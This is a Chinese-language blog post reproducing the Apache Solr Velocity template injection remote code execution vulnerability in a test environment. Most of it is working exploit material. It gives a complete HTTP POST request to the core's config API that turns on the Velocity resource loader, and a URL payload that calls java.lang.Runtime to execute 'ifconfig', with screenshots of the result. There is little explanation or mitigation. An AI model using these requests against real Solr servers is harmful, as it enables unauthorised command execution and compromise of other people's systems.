title: Apache Solr Velocity模板注入远程命令执行漏洞
date: '2019-11-20 15:06:26'
updated: '2019-11-20 15:29:29'
tags: [Apache, solr]
permalink: /articles/2019/11/20/1574233586043.html
---
**漏洞详情可以去freebuf上去看原理，这里复现一下漏洞过程。**
可以用vulhub搭建或者直接去找一个。
## 漏洞复现
网上很多，找个环境复现一下。
![image.png](https://img.hacpai.com/file/2019/11/image-82efd8ef.png)
找到core，并查看配置。
![image.png](https://img.hacpai.com/file/2019/11/image-1e4c8980.png)
![image.png](https://img.hacpai.com/file/2019/11/image-fe868369.png)
**查看配置的方法：**
![image.png](https://img.hacpai.com/file/2019/11/image-f2056009.png)
访问该core的config路径,查看其配置,并搜索params.resource.loader.enabled参数，
其默认是关闭的。但是不知道我这个为什么是开着的，那直接就可以利用了。
但是先附上开启poc
```
POST /solr/test/config HTTP/1.1  
Host: 172.26.1.173:8983  
User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3  
Content-Type: application/json  
Accept-Encoding: gzip, deflate  
Connection: close  
Content-Length: 259

{  
“update-queryresponsewriter”: {  
“startup”: “lazy”,  
“name”: “velocity”,  
“class”: “solr.VelocityResponseWriter”,  
“template.base.dir”: “”,  
“solr.resource.loader.enabled”: “true”,  
“params.resource.loader.enabled”: “true”  
}  
}
```
![image.png](https://img.hacpai.com/file/2019/11/image-b6794f6e.png)
因为我的是开启过了，所以会这样吧。
然后在url上输入rce。
```
select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27ifconfig%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end
```
![image.png](https://img.hacpai.com/file/2019/11/image-cf513c46.png)

![image.png](https://img.hacpai.com/file/2019/11/image-5364a736.png)

![image.png](https://img.hacpai.com/file/2019/11/image-44d2ced5.png)








